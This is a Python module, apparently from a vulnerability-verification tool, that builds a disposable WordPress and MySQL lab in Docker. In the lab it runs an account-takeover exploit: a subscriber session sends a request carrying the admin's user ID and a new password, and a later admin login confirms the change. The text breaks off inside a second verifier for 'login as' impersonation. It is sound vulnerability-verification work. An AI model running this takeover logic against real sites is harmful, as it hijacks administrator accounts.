"""Dynamic verifier: spins up a REAL, throwaway WordPress + MySQL in Docker, installs the fetched
plugin, and attempts the account-takeover an "missing-authorization"/"idor" hypothesis describes —
log in as the low-privilege user, send the crafted request against an admin account, and confirm by
actually logging in again with the new password. This is the live counterpart to the static PoC
webexploit.py builds and the source grounding websource.py does: everything up to here (classify,
fetch, grep, build PoC) is static; this module is the one piece that RUNS something, so it is kept
separate, Docker-gated, and torn down unconditionally.

Scope (deliberately narrow, matching binoracle's "no false positives" rule — broaden per-class over
time rather than claim more than this can prove): this verifies ONE concrete shape — a WordPress
plugin where an authenticated low-privilege user can change ANOTHER user's email/password because
the handler trusts a user-id parameter from the request instead of checking it against the session.
That is exactly the CVE-2026-5523 shape this was built against. It does not attempt SQLi/XSS/RCE/...
dynamically; those need different confirmation harnesses (see the module docstring's TODO list) and
are future work, not simulated here.

Honesty: `verified` is set to True ONLY when a SECOND, independent login — as the admin account,
with the password THIS run's crafted request set — succeeds against the live WordPress instance.
That is unambiguous proof of account takeover, not a 200 status code or a guess. Everything else
(fetch, plugin install, first login, the crafted request itself) is logged as evidence either way.

Requires a reachable Docker DAEMON (not just the `docker` CLI) — checked explicitly, since the CLI
can be installed with no daemon running (degrades honestly, NOT_APPLICABLE, same pattern as
autosrop_aarch64.py for a missing cross toolchain). Pulls wordpress/mysql/alpine images on first use
(internet needed for that one-time cost, same as `make pwn-image`); the WordPress instance runs on
an isolated per-run Docker network/volume and is always torn down. Its HTTP port is published on a
random high port on all interfaces (see start_wordpress()/_lab_host(): binoracle normally drives
the HOST's daemon through a mounted socket, so a 127.0.0.1-only bind would be unreachable from
binoracle's own container), scoped down by being ephemeral, randomly-ported, and torn down on every
exit — not by network isolation, so only run this against trusted hosts/networks.
"""
from __future__ import annotations

import io
import json
import os
import re
import secrets
import shutil
import socket
import subprocess
import tarfile
import time
from dataclasses import dataclass, field
from typing import Callable, List, Optional

_MYSQL_IMAGE = "mysql:5.7"
_WP_IMAGE = "wordpress:php8.2-apache"
_WPCLI_IMAGE = "wordpress:cli"
_ALPINE_IMAGE = "alpine:3.20"

_ID_HINTS = ("user_id", "uid", "id", "target", "target_id", "user")
_EMAIL_HINTS = ("email", "mail", "user_email")
_PASS_HINTS = ("pass", "password", "pwd", "user_pass")
_PATH_HINTS = ("file", "path", "page", "template", "include", "doc", "filename", "tpl", "view")


@dataclass
class WpVerifyResult:
    ok: bool = False                 # el flujo corrio hasta el final sin errores de infraestructura
    available: bool = True           # False si ni se pudo intentar (sin Docker daemon, etc.)
    verified: bool = False           # SOLO True si el segundo login con la nueva password funciono
    detail: str = ""
    logs: List[str] = field(default_factory=list)
    limitations: List[str] = field(default_factory=list)
    # evidencia REAL y concreta de la ejecucion contra el laboratorio efimero (no plantilla, no
    # placeholders): el payload exacto enviado, el admin_id real del laboratorio, el codigo de
    # respuesta real, y la password/email reales que el ataque fijo y que el segundo login
    # confirmo que funcionaban. Son datos de un WordPress desechable que ya no existe cuando el
    # analista los lee -- no filtran nada de ningun objetivo real, y sirven como prueba dura de que
    # el flujo se ejecuto de verdad, no que se simulo.
    evidence: dict = field(default_factory=dict)


def _run(cmd: List[str], timeout: float = 60.0, input_text: str = None) -> subprocess.CompletedProcess:
    return subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, input=input_text)


def _docker_daemon_ok(timeout: float = 8.0) -> bool:
    """A mano de _docker_image_ok en _sandbox.py: el binario `docker` puede existir sin que el
    DAEMON este arriba (exactamente lo que pasa en este propio sandbox de desarrollo), asi que se
    comprueba de verdad con un comando real y acotado, nunca solo shutil.which."""
    if not shutil.which("docker"):
        return False
    try:
        return _run(["docker", "info"], timeout=timeout).returncode == 0
    except subprocess.TimeoutExpired:
        return False
    except Exception:
        return False


def _pick_param(params, hints) -> Optional[str]:
    """Elige el nombre de parametro mas probable para un rol (id/email/password) entre los que
    cito el LLM, por coincidencia de substring contra una lista de pistas ordenada por prioridad."""
    if not params:
        return None
    names = list(params.keys()) if isinstance(params, dict) else list(params)
    low = {n: n.lower() for n in names}
    for h in hints:
        for n, l in low.items():
            if h in l:
                return n
    return None


def _token() -> str:
    return secrets.token_hex(4)


def _lab_host() -> str:
    """Host desde el que ESTE PROCESO (el propio binoracle, haciendo las peticiones HTTP del
    ataque) debe hablarle al laboratorio. Cuando binoracle corre dentro de un contenedor y usa el
    socket del HOST para pilotar Docker (Docker-fuera-de-Docker, el patron que docker-compose.yml
    monta), el puerto que publicamos para WordPress se abre en el 127.0.0.1 del HOST, NO en el
    127.0.0.1 de nuestro propio contenedor -- son namespaces de red distintos. Sin esto, http_ready
    y las peticiones del ataque nunca llegaban a WordPress aunque Apache arrancara bien (confirmado
    en vivo: los logs mostraban 'resuming normal operations' pero 'WordPress no respondio a
    tiempo' seguia saliendo). host.docker.internal resuelve al HOST de verdad (Docker Desktop en
    Mac/Windows de forma nativa; en Linux via el extra_hosts que docker-compose.yml anade). Si
    binoracle NO corre en un contenedor (p.ej. los tests de este repo en el sandbox de desarrollo),
    127.0.0.1 ya es correcto y host.docker.internal no existira."""
    if os.path.exists("/.dockerenv"):
        try:
            socket.gethostbyname("host.docker.internal")
            return "host.docker.internal"
        except OSError:
            pass
    return "127.0.0.1"


class _Lab:
    """Agrupa los recursos Docker efimeros de una verificacion (red/volumen/contenedores) y
    garantiza su limpieza. Nunca deja nada vivo, tampoco si algo falla a mitad de camino."""

    def __init__(self, tag: str):
        self.tag = tag
        self.net = f"binoracle-wpverify-{tag}"
        self.vol = f"binoracle-wpverify-{tag}-html"
        self.mysql = f"binoracle-wpverify-{tag}-db"
        self.wp = f"binoracle-wpverify-{tag}-wp"
        self._created: List[str] = []
        self._db_env: List[str] = []   # -e flags reusados por wp_cli() (ver nota en wp_cli)

    def sh(self, *args, timeout=60.0, input_text=None):
        return _run(["docker"] + list(args), timeout=timeout, input_text=input_text)

    def setup_network_and_volume(self):
        self.sh("network", "create", self.net, timeout=30)
        self._created.append(("network", self.net))
        self.sh("volume", "create", self.vol, timeout=30)
        self._created.append(("volume", self.vol))

    def start_mysql(self, root_pw: str, db_pw: str):
        self.sh("run", "-d", "--name", self.mysql, "--network", self.net, "--platform", "linux/amd64",
               "-e", f"MYSQL_ROOT_PASSWORD={root_pw}", "-e", "MYSQL_DATABASE=wordpress",
               "-e", "MYSQL_USER=wordpress", f"-e", f"MYSQL_PASSWORD={db_pw}", _MYSQL_IMAGE,
               timeout=90)
        self._created.append(("container", self.mysql))

    def mysql_ready(self, db_pw: str, tries: int = 150, delay: float = 3.0) -> bool:
        # tries*delay ~ 7.5 min por defecto: en Mac Apple Silicon, mysql:5.7 (sin imagen arm64)
        # corre bajo emulacion (Rosetta/QEMU en Docker Desktop) y el arranque de InnoDB en la
        # PRIMERA ejecucion puede tardar varios minutos -- confirmado en vivo: 40 intentos x 2s
        # (80s) no bastaban y 'MySQL no respondio a tiempo' salia con el contenedor aun
        # inicializando, no realmente colgado.
        for _ in range(tries):
            r = self.sh("exec", self.mysql, "mysqladmin", "ping", "-uwordpress",
                       f"-p{db_pw}", "-h", "127.0.0.1", timeout=10)
            if r.returncode == 0:
                return True
            time.sleep(delay)
        return False

    def start_wordpress(self, db_pw: str) -> Optional[str]:
        """Publica el puerto 80 en un puerto ALEATORIO de todas las interfaces del host (0.0.0.0).
        No se puede restringir a 127.0.0.1: cuando binoracle corre en un contenedor (el caso real,
        via Docker-fuera-de-Docker), un bind a 127.0.0.1 solo seria alcanzable desde el PROPIO
        host, nunca desde nuestro contenedor ni desde ningun otro -- ver _lab_host(). El riesgo se
        acota con un puerto aleatorio de corta vida, torn down siempre al final, y siendo esto un
        laboratorio efimero pensado solo para objetivos/engagements autorizados."""
        # Guardadas para reusar en wp_cli(): wp-config.php (de la imagen oficial) lee estas
        # variables en TIEMPO DE EJECUCION via getenv_docker(), no las hornea en el fichero. El
        # contenedor wp-cli es OTRO contenedor (solo comparte el volumen, no el entorno del
        # contenedor de Apache), asi que sin pasarselas tambien a el, getenv_docker() cae a su
        # valor por defecto ('mysql') y wp-cli intenta conectar a un host que no existe.
        self._db_env = ["-e", f"WORDPRESS_DB_HOST={self.mysql}", "-e", "WORDPRESS_DB_NAME=wordpress",
                        "-e", "WORDPRESS_DB_USER=wordpress", "-e", f"WORDPRESS_DB_PASSWORD={db_pw}"]
        self.sh("run", "-d", "--name", self.wp, "--network", self.net, "--platform", "linux/amd64",
               "-v", f"{self.vol}:/var/www/html", *self._db_env,
               "-p", "0.0.0.0::80", _WP_IMAGE, timeout=90)
        self._created.append(("container", self.wp))
        r = self.sh("port", self.wp, "80", timeout=15)
        m = re.search(r":(\d+)\s*$", (r.stdout or "").strip())
        return m.group(1) if m else None

    def http_ready(self, port: str, tries: int = 150, delay: float = 3.0) -> bool:
        # igual que mysql_ready (~7.5 min): confirmado en vivo que 80x3s (4 min) tampoco bastaba
        # en Apple Silicon -- Apache/PHP bajo emulacion amd64 puede tardar varios minutos en
        # responder al primer arranque, igual que le pasaba a MySQL.
        import urllib.request
        url = f"http://{_lab_host()}:{port}/wp-login.php"
        for _ in range(tries):
            try:
                with urllib.request.urlopen(url, timeout=5) as r:
                    if r.status < 500:
                        return True
            except Exception:
                pass
            time.sleep(delay)
        return False

    def logs_tail(self, name: str, lines: int = 40) -> str:
        """Ultimas lineas del log de un contenedor, para diagnosticar fallos de arranque sin
        tener que reproducirlos (p.ej. por que Apache/MySQL no respondieron a tiempo)."""
        try:
            r = self.sh("logs", "--tail", str(lines), name, timeout=15)
            return ((r.stdout or "") + (r.stderr or "")).strip()
        except Exception as e:
            return f"(no se pudieron leer logs de {name}: {e})"

    def write_canary(self, path: str, content: str, timeout: float = 15.0) -> bool:
        """Escribe un fichero DENTRO del propio contenedor de Apache (no en el volumen compartido
        /var/www/html -- esto usa `docker exec` directo), en una ruta del sistema de ficheros real
        del contenedor. Sirve como marcador para verificar path-traversal/LFI de verdad: si el
        endpoint vulnerable, al pedir una ruta ajena al directorio web, devuelve este contenido
        exacto, es prueba inequivoca de lectura de fichero real -- no una deduccion por status code."""
        r = self.sh("exec", "-i", self.wp, "sh", "-c", f"cat > {path}",
                    input_text=content, timeout=timeout)
        return r.returncode == 0

    def wp_cli(self, *args, timeout=120.0) -> subprocess.CompletedProcess:
        return self.sh("run", "--rm", "--network", self.net, "--platform", "linux/amd64",
                       "-v", f"{self.vol}:/var/www/html", *self._db_env, "--user", "33:33",
                       _WPCLI_IMAGE, "wp", "--path=/var/www/html", *args, timeout=timeout)

    def install_plugin(self, host_plugin_dir: str, slug: str, timeout=60.0) -> bool:
        """Copia el plugin (ya descargado a `host_plugin_dir`, que contiene <slug>/...) dentro del
        volumen compartido. NO usa un bind mount de `host_plugin_dir`: ese directorio lo creo YO
        (websource.py), dentro del PROPIO contenedor de binoracle -- con Docker-fuera-de-Docker el
        `docker run` real lo ejecuta el daemon del HOST, que no tiene forma de ver una ruta que solo
        existe en nuestro filesystem (confirmado en vivo: tras arreglar la resolucion de red,
        'no se pudo copiar el plugin al laboratorio' seguia saliendo). En vez de eso, empaqueto el
        plugin en un tar EN MEMORIA (si que puedo leerlo yo, es mi propio disco) y lo paso por
        stdin a un contenedor Alpine efimero que solo necesita el volumen Docker con nombre (ese si
        es un recurso del daemon, visible sea donde sea que corra binoracle)."""
        plugin_path = os.path.join(host_plugin_dir, slug)
        buf = io.BytesIO()
        with tarfile.open(fileobj=buf, mode="w") as tf:
            tf.add(plugin_path, arcname=slug)
        try:
            r = subprocess.run(
                ["docker", "run", "-i", "--rm", "--platform", "linux/amd64",
                 "-v", f"{self.vol}:/var/www/html", _ALPINE_IMAGE, "sh", "-c",
                 "mkdir -p /var/www/html/wp-content/plugins && "
                 "tar -xf - -C /var/www/html/wp-content/plugins"],
                input=buf.getvalue(), capture_output=True, timeout=timeout)
        except subprocess.TimeoutExpired:
            return False
        return r.returncode == 0

    def teardown(self):
        for kind, name in reversed(self._created):
            try:
                if kind == "container":
                    self.sh("rm", "-f", name, timeout=30)
                elif kind == "network":
                    self.sh("network", "rm", name, timeout=15)
                elif kind == "volume":
                    self.sh("volume", "rm", "-f", name, timeout=15)
            except Exception:
                pass


def _screenshot_authenticated(base_url: str, session, path: str) -> Optional[str]:
    """Reusa las cookies de una requests.Session YA autenticada (via _wp_login) para abrir esa
    misma sesion en un Chromium headless (Playwright) y capturar una foto REAL de la pagina --
    evidencia visual, no solo un codigo HTTP. Mismo patron de degradacion honesta que
    dynamic.browser_observe(): si Playwright no esta instalado o el navegador no arranca, devuelve
    None sin romper la verificacion (la evidencia textual ya probada sigue siendo valida sin
    captura). Devuelve la imagen como PNG codificado en base64, o None."""
    try:
        from playwright.sync_api import sync_playwright
    except Exception:
        return None
    import base64
    import tempfile
    from urllib.parse import urlsplit
    host = urlsplit(base_url).hostname or "127.0.0.1"
    cookies = [{"name": c.name, "value": c.value, "domain": host, "path": "/"} for c in session.cookies]
    fd, out_path = tempfile.mkstemp(suffix=".png")
    os.close(fd)
    try:
        with sync_playwright() as pw:
            browser = pw.chromium.launch(headless=True, args=["--no-sandbox"])
            try:
                ctx = browser.new_context(viewport={"width": 1280, "height": 900})
                ctx.add_cookies(cookies)
                page = ctx.new_page()
                page.goto(base_url + path, wait_until="load", timeout=15000)
                page.screenshot(path=out_path, full_page=True)
            finally:
                browser.close()
        with open(out_path, "rb") as f:
            return base64.b64encode(f.read()).decode("ascii")
    except Exception:
        return None
    finally:
        try:
            os.unlink(out_path)
        except OSError:
            pass


def _screenshot_failed_login(base_url: str, user: str, wrong_password: str) -> Optional[str]:
    """Automatiza el FORMULARIO real de wp-login.php (Playwright, no una peticion POST cruda) con
    una password y captura la pantalla resultante. Se usa DESPUES del ataque, con la password
    ORIGINAL del admin -- si el ataque de verdad la sobreescribio, WordPress debe rechazarla, y
    esta funcion deja la pantalla de error real como prueba (no solo lo deducimos por logica).
    Mismo patron de degradacion honesta que _screenshot_authenticated: sin Playwright, None."""
    try:
        from playwright.sync_api import sync_playwright
    except Exception:
        return None
    import base64
    import tempfile
    fd, out_path = tempfile.mkstemp(suffix=".png")
    os.close(fd)
    try:
        with sync_playwright() as pw:
            browser = pw.chromium.launch(headless=True, args=["--no-sandbox"])
            try:
                page = browser.new_context(viewport={"width": 1280, "height": 900}).new_page()
                page.goto(base_url + "/wp-login.php", wait_until="load", timeout=15000)
                page.fill("#user_login", user)
                page.fill("#user_pass", wrong_password)
                page.click("#wp-submit")
                page.wait_for_load_state("load", timeout=10000)
                page.screenshot(path=out_path, full_page=True)
            finally:
                browser.close()
        with open(out_path, "rb") as f:
            return base64.b64encode(f.read()).decode("ascii")
    except Exception:
        return None
    finally:
        try:
            os.unlink(out_path)
        except OSError:
            pass


def _wp_login(base_url: str, user: str, password: str, timeout: float = 15.0):
    """Login real por cookie de WordPress (wp-login.php). Devuelve una requests.Session logueada,
    o None si no hay cookie de sesion (login fallido). Requiere la libreria `requests` (pwntools ya
    la arrastra como dependencia, asi que esta presente donde el resto del motor de exploits lo esta)."""
    import requests
    s = requests.Session()
    try:
        r = s.post(f"{base_url}/wp-login.php",
                  data={"log": user, "pwd": password, "wp-submit": "Log In",
                        "redirect_to": f"{base_url}/wp-admin/", "testcookie": "1"},
                  timeout=timeout, allow_redirects=True)
    except Exception:
        return None
    logged_in = any(c.name.startswith("wordpress_logged_in_") for c in s.cookies)
    return s if logged_in else None


def _check_prereqs(plugin_source_dir: str, slug: str) -> Optional[WpVerifyResult]:
    """Comprobaciones compartidas por todos los verificadores dinamicos (Docker daemon alcanzable,
    el codigo del plugin tiene la forma esperada). Devuelve un WpVerifyResult YA poblado si algo
    falla (el caller solo tiene que `return`lo), o None si todo esta en orden para seguir."""
    res = WpVerifyResult()
    if not _docker_daemon_ok():
        res.available = False
        if not shutil.which("docker"):
            res.detail = "sin cliente docker instalado"
            res.limitations.append("verificacion dinamica NO intentada: el CLI de `docker` no "
                                   "esta instalado en este contenedor (reconstruye la imagen: "
                                   "`docker compose up --build`, ya deberia traerlo)")
        else:
            res.detail = "sin daemon Docker alcanzable"
            res.limitations.append("verificacion dinamica NO intentada: el CLI de docker esta, "
                                   "pero no se alcanza ningun daemon. Si corres binoracle dentro "
                                   "de Docker, monta el socket del host en docker-compose.yml "
                                   "(/var/run/docker.sock:/var/run/docker.sock) y confirma que "
                                   "Docker Desktop/dockerd esta arrancado en tu maquina")
        return res
    if not os.path.isdir(os.path.join(plugin_source_dir, slug)):
        res.detail = f"no se encuentra {slug}/ dentro de {plugin_source_dir}"
        res.limitations.append("el codigo del plugin no tiene la forma esperada (<slug>/...)")
        return res
    return None


@dataclass
class _LabSession:
    """Laboratorio YA levantado hasta el punto comun a TODOS los verificadores dinamicos: WordPress
    instalado, plugin activo, subscriber creado y logueado -- lo unico que cambia entre un
    account-takeover por password y un login-as directo es lo que se hace A PARTIR de aqui."""
    lab: "_Lab"
    base_url: str
    admin_id: str
    admin_user: str
    admin_pass: str
    sub_user: str
    sub_pass: str
    sub_sess: object           # requests.Session, YA autenticada como el subscriber
    admin_sess: object         # requests.Session, autenticada como el admin CON SU PASSWORD ORIGINAL
    shots: list
    capture: Callable


def _bootstrap_lab(lab: "_Lab", plugin_source_dir: str, slug: str, step, res: WpVerifyResult,
                   t0: float, budget_s: float) -> Optional[_LabSession]:
    """Pasos 1-4 compartidos (ver _LabSession). Devuelve None si algo falla, con `res` ya relleno
    (detail/logs/limitations) -- el caller solo tiene que `return res` sin mas logica."""
    root_pw, db_pw = secrets.token_urlsafe(16), secrets.token_urlsafe(16)
    admin_user, admin_pass = "binoracle_admin", secrets.token_urlsafe(12)
    sub_user, sub_pass = "binoracle_subscriber", secrets.token_urlsafe(12)
    shots: List[dict] = []
    ctx = {}

    def capture(sess_, url_path, es_caption, en_caption):
        if "base_url" not in ctx:
            return
        png = _screenshot_authenticated(ctx["base_url"], sess_, url_path)
        if png:
            shots.append({"caption_es": es_caption, "caption_en": en_caption, "png_b64": png,
                         "url": ctx["base_url"] + url_path})

    step("levantando laboratorio WordPress+MySQL aislado en Docker (red/volumen propios)...")
    lab.setup_network_and_volume()
    lab.start_mysql(root_pw, db_pw)
    if not lab.mysql_ready(db_pw):
        res.detail = "MySQL no respondio a tiempo"
        res.logs.append("docker logs (mysql):\n" + lab.logs_tail(lab.mysql))
        return None
    step("MySQL listo; arrancando WordPress...")
    port = lab.start_wordpress(db_pw)
    if not port:
        res.detail = "no se pudo publicar el puerto de WordPress"
        res.logs.append("docker logs (wordpress):\n" + lab.logs_tail(lab.wp))
        return None
    if not lab.http_ready(port):
        res.detail = "WordPress no respondio a tiempo"
        res.logs.append("docker logs (wordpress):\n" + lab.logs_tail(lab.wp))
        return None
    base_url = f"http://{_lab_host()}:{port}"
    ctx["base_url"] = base_url
    step(f"WordPress listo en {base_url}; instalando core via wp-cli...")

    r = lab.wp_cli("core", "install", f"--url={base_url}", "--title=binoracle-lab",
                   f"--admin_user={admin_user}", f"--admin_password={admin_pass}",
                   "--admin_email=admin@binoracle-lab.invalid", "--skip-email", timeout=90)
    if r.returncode != 0:
        res.detail = f"wp core install fallo: {(r.stderr or r.stdout or '')[:300]}"
        return None
    admin_id = lab.wp_cli("user", "get", admin_user, "--field=ID", timeout=30).stdout.strip()
    step(f"WordPress instalado; admin id={admin_id}")
    step("capturando pantalla: WordPress recien instalado y en pie (laboratorio en vivo)...")
    import requests as _requests
    capture(_requests.Session(), "/wp-login.php",
           "Paso 1: WordPress recien instalado y accesible (laboratorio en vivo, antes de "
           "tocar nada).",
           "Step 1: WordPress freshly installed and reachable (live lab, before anything "
           "is touched).")

    step(f"copiando el plugin ({slug}) al volumen e instalandolo...")
    if not lab.install_plugin(plugin_source_dir, slug):
        res.detail = "no se pudo copiar el plugin al laboratorio"
        return None
    r = lab.wp_cli("plugin", "activate", slug, timeout=60)
    if r.returncode != 0:
        res.detail = f"activacion del plugin fallo: {(r.stderr or r.stdout or '')[:300]}"
        res.limitations.append("si el slug/version descargados no coinciden con el afectado, "
                               "la activacion puede fallar por requisitos del propio plugin")
        return None
    step("plugin activo. capturando pantalla: panel de plugins como admin (el plugin "
         "vulnerable, activo)...")
    admin_sess = _wp_login(base_url, admin_user, admin_pass)
    if admin_sess is not None:
        capture(admin_sess, "/wp-admin/plugins.php",
               f"Paso 2: el plugin '{slug}' instalado y ACTIVO en el laboratorio (vista del "
               f"admin, con su password ORIGINAL -- antes del ataque).",
               f"Step 2: plugin '{slug}' installed and ACTIVE in the lab (admin's view, with "
               f"their ORIGINAL password -- before the attack).")
    step("Creando el usuario de bajo privilegio (subscriber)...")

    r = lab.wp_cli("user", "create", sub_user, "subscriber@binoracle-lab.invalid",
                   "--role=subscriber", f"--user_pass={sub_pass}", timeout=30)
    if r.returncode != 0:
        res.detail = f"creacion del subscriber fallo: {(r.stderr or r.stdout or '')[:300]}"
        return None
    step("capturando pantalla: usuario de bajo privilegio creado de verdad (lista de "
         "usuarios, vista admin)...")
    if admin_sess is not None:
        capture(admin_sess, "/wp-admin/users.php",
               f"Paso 3: cuenta '{sub_user}' creada de verdad con rol Subscriber (vista de "
               f"la lista de usuarios del admin) -- el unico acceso que tiene el atacante "
               f"antes de explotar nada.",
               f"Step 3: account '{sub_user}' really created with the Subscriber role (admin's "
               f"user list view) -- the only access the attacker has before exploiting "
               f"anything.")

    if budget_s - (time.time() - t0) < 30:
        res.detail = "presupuesto de tiempo agotado antes de intentar el ataque"
        return None

    step(f"iniciando sesion como '{sub_user}' (bajo privilegio)...")
    sess = _wp_login(base_url, sub_user, sub_pass)
    if sess is None:
        res.detail = "no se pudo iniciar sesion como el usuario de bajo privilegio"
        return None
    res.logs.append(f"login subscriber: OK ({sub_user})")
    step("capturando pantalla: sesion del atacante ANTES del ataque (bajo privilegio)...")
    capture(sess, "/wp-admin/profile.php",
           f"Paso 4: sesion real como '{sub_user}' (subscriber, bajo privilegio) -- esta "
           f"cuenta es la unica que el atacante controla ANTES del ataque.",
           f"Step 4: real session as '{sub_user}' (subscriber, low-privilege) -- this is the "
           f"only account the attacker controls BEFORE the attack.")

    return _LabSession(lab=lab, base_url=base_url, admin_id=admin_id, admin_user=admin_user,
                       admin_pass=admin_pass, sub_user=sub_user, sub_pass=sub_pass,
                       sub_sess=sess, admin_sess=admin_sess, shots=shots, capture=capture)


def verify_wordpress_account_takeover(
    plugin_source_dir: str, slug: str, endpoint: str, http_method: str,
    parameters, id_param_hint: str = "", email_param_hint: str = "", pass_param_hint: str = "",
    on_step: Optional[Callable[[str], None]] = None, budget_s: float = 1200.0,
    # 1200s (20 min): en Mac Apple Silicon, mysql:5.7/wordpress no tienen imagen arm64 nativa y
    # corren emulados (linux/amd64) via Docker Desktop -- el arranque de MySQL en la PRIMERA
    # ejecucion puede tardar varios minutos por si solo (ver mysql_ready). 600s se quedaba corto
    # y el laboratorio se desmontaba con MySQL aun inicializando, no realmente colgado.
) -> WpVerifyResult:
    """Levanta WordPress+MySQL en Docker, instala el plugin ya descargado en `plugin_source_dir`
    (debe contener `<slug>/...`), crea un usuario subscriber y un admin, inicia sesion como el
    subscriber y envia la peticion de `endpoint`/`http_method`/`parameters` apuntando al ID del
    admin con un email/password nuevos. `verified=True` SOLO si un login posterior como admin con
    la password nueva funciona de verdad. Siempre desmonta el laboratorio al terminar."""
    step = on_step or (lambda _m: None)
    pre = _check_prereqs(plugin_source_dir, slug)
    if pre is not None:
        return pre
    res = WpVerifyResult()
    t0 = time.time()

    id_param = id_param_hint or _pick_param(parameters, _ID_HINTS)
    email_param = email_param_hint or _pick_param(parameters, _EMAIL_HINTS)
    pass_param = pass_param_hint or _pick_param(parameters, _PASS_HINTS)
    if not id_param or not (email_param or pass_param):
        res.detail = "no se identifico un parametro de ID y de email/password en la hipotesis"
        res.limitations.append("la verificacion de account-takeover necesita saber que parametro "
                               "lleva el ID objetivo y cual el email/password nuevos; afina "
                               "'parameters' en la hipotesis del LLM o pasalos a mano")
        return res

    lab = _Lab(_token())
    try:
        boot = _bootstrap_lab(lab, plugin_source_dir, slug, step, res, t0, budget_s)
        if boot is None:
            return res

        new_email = f"takeover-{_token()}@binoracle-lab.invalid"
        new_pass = secrets.token_urlsafe(12)
        payload = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
        payload[id_param] = boot.admin_id
        if email_param:
            payload[email_param] = new_email
        if pass_param:
            payload[pass_param] = new_pass
        m = (http_method or "POST").upper()
        # evidencia REAL: el payload exacto que se envio de verdad (datos de un laboratorio
        # desechable, no de un objetivo real -- seguro de mostrar tal cual).
        res.evidence.update({
            "login_bajo_privilegio": boot.sub_user, "login_bajo_privilegio_password": boot.sub_pass,
            "admin_user": boot.admin_user, "admin_id": boot.admin_id,
            "id_param": id_param, "email_param": email_param or None, "pass_param": pass_param or None,
            "metodo": m, "endpoint": endpoint, "payload_enviado": dict(payload),
        })
        step(f"enviando la peticion {m} {endpoint} dirigida al admin (id={boot.admin_id})...")
        try:
            resp = boot.sub_sess.request(m, boot.base_url + endpoint,
                               data=payload if m != "GET" else None,
                               params=payload if m == "GET" else None, timeout=20)
            res.logs.append(f"peticion enviada: {resp.status_code}")
            res.evidence["status_code_respuesta"] = resp.status_code
            res.evidence["respuesta_cuerpo_recorte"] = (resp.text or "")[:300]
        except Exception as e:
            res.detail = f"fallo enviando la peticion: {e}"
            return res

        step("confirmando: intentando iniciar sesion como admin con la password nueva..." )
        confirm = _wp_login(boot.base_url, boot.admin_user, new_pass) if pass_param else None
        if confirm is not None:
            res.verified = True
            res.ok = True
            res.detail = (f"ACCOUNT TAKEOVER confirmado: login como '{boot.admin_user}' con la "
                          f"password fijada por la peticion funciono de verdad "
                          f"(admin_id={boot.admin_id})")
            res.evidence["password_nueva_confirmada"] = new_pass
            res.evidence["confirmacion"] = (f"login real como '{boot.admin_user}' con la password "
                                            f"'{new_pass}' funciono (cookie wordpress_logged_in_* "
                                            f"presente tras el POST a wp-login.php)")
            step("VERIFICADO: el login como admin con la password nueva funciono.")
            step("capturando pantalla: panel de WordPress YA como admin, con la password "
                 "fijada por el ataque (prueba final)...")
            boot.capture(confirm, "/wp-admin/",
                   f"Paso 5: ACCOUNT TAKEOVER confirmado -- panel de administracion completo de "
                   f"'{boot.admin_user}', accedido con la password que el ataque del paso 4 fijo, "
                   f"no con la password original del admin.",
                   f"Step 5: ACCOUNT TAKEOVER confirmed -- '{boot.admin_user}'s full admin panel, "
                   f"accessed with the password step 4's attack set, not the admin's original "
                   f"password.")
            step("capturando pantalla: la password ORIGINAL del admin ya NO funciona (prueba "
                 "de que el ataque la sobreescribio de verdad)...")
            old_pw_shot = _screenshot_failed_login(boot.base_url, boot.admin_user, boot.admin_pass)
            if old_pw_shot:
                boot.shots.append({
                    "caption_es": (f"Paso 6: intentar entrar como '{boot.admin_user}' con su "
                                   f"password ORIGINAL (la de antes del ataque) ahora FALLA -- "
                                   f"WordPress rechaza el formulario real de login, prueba de que "
                                   f"la password se sobreescribio de verdad, no que haya dos "
                                   f"validas."),
                    "caption_en": (f"Step 6: logging in as '{boot.admin_user}' with their "
                                   f"ORIGINAL password (from before the attack) now FAILS -- "
                                   f"WordPress rejects the real login form, proof the password "
                                   f"was really overwritten, not that two passwords are now "
                                   f"valid."),
                    "png_b64": old_pw_shot, "url": boot.base_url + "/wp-login.php",
                })
            res.evidence["screenshots"] = boot.shots
            return res

        # si no hay pass_param (solo email, p.ej.), confirma por wp-cli leyendo el email actual
        if email_param and not pass_param:
            cur = lab.wp_cli("user", "get", boot.admin_id, "--field=user_email",
                             timeout=20).stdout.strip()
            res.ok = True
            res.verified = (cur == new_email)
            res.evidence["email_nuevo_confirmado"] = new_email
            res.evidence["email_leido_tras_ataque"] = cur
            res.detail = (f"email del admin tras la peticion: {cur!r} "
                          f"(esperado: {new_email!r}) -> {'COINCIDE' if res.verified else 'no coincide'}")
            res.evidence["screenshots"] = boot.shots
            return res

        res.ok = True
        res.detail = "la peticion se envio pero no se pudo confirmar el efecto (login posterior fallo)"
        res.evidence["screenshots"] = boot.shots
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = f"timeout de infraestructura: {e}"
        return res
    except Exception as e:
        res.detail = f"error inesperado: {e}"
        return res
    finally:
        step("desmontando el laboratorio (contenedores/red/volumen)...")
        lab.teardown()


def verify_wordpress_direct_login_as(
    plugin_source_dir: str, slug: str, endpoint: str, http_method: str,
    parameters, id_param_hint: str = "", confirm_path: str = "/wp-admin/users.php",
    on_step: Optional[Callable[[str], None]] = None, budget_s: float = 1200.0,
) -> WpVerifyResult:
    """Verifica la OTRA forma de account-takeover por missing-authorization: un plugin cuya accion
    deja a un usuario de bajo privilegio CONVERTIRSE directamente en la sesion de otro usuario
    ("login as", p.ej. CVE-2024-43982 en Login As Users: `gwslau_login_as_user_action()` sin
    comprobacion de capability), en vez de cambiar una credencial. Aqui NO hay password nueva que
    confirmar por un segundo login (ver verify_wordpress_account_takeover() para ese otro caso);
    la confirmacion principal es, con la MISMA sesion del atacante (sin re-loguearse): esa sesion,
    que antes de la peticion NO podia ver `confirm_path` (pagina solo-admin), ahora SI la ve de
    verdad (HTTP 200, sin redirigir a wp-login.php y sin el mensaje de WordPress de 'no tienes
    permiso') -- ya se confirmo justo antes que esa misma pagina estaba denegada, asi que esta
    transicion por si sola es prueba fuerte. Se registra TAMBIEN si alguna cookie de la sesion
    cambio (evidencia de apoyo, no un requisito): distintos plugins suplantan de formas distintas
    -- algunos reemplazan la cookie de auth de WordPress (wordpress_logged_in_*), otros (como
    Login As Users, CVE-2024-43982: gwslau_login_as_user_action() guarda el ID en $_SESSION de PHP
    y lo aplica en cada peticion via el hook 'init') ni tocan esa cookie, solo la sesion nativa de
    PHP -- exigir el cambio de UNA cookie concreta habria dado un falso negativo contra ese CVE
